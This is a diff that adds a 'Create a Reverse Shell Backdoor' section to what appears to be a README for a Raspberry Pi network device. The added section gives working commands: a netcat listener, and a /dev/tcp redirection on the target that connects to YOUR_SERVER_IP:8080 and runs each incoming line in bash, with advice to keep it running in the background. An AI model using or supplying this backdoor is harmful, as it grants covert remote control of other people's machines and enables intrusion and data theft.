@@ -50,6 +50,19 @@ sudo shutdown -h now
 ssh pi@172.16.0.1
 ```
 
+## Create a Reverse Shell Backdoor
+
+1. Host Netcat server on your machine.
+```shell
+nc -l -p 8080 -vvv
+```
+2. Create a descriptor on target machine. Make sure to change the IP address to your server. Your server must be in the same network as target unless you have a public IP that can be accessed by target machine everywhere. \(Run the descriptor in background is recommended.\)
+```shell
+exec 5<>/dev/tcp/YOUR_SERVER_IP/8080
+cat <&5 | while read line; do $line 2>&5 >&5; done
+```
+3. On your server, when you see a connection being created, you then have bash access to the target machine. You would be able to see the output of bash directly on your machine with the setup above.
+
 ## Author
 
 **[Brian Sung](https://github.com/ohbriansung)** 
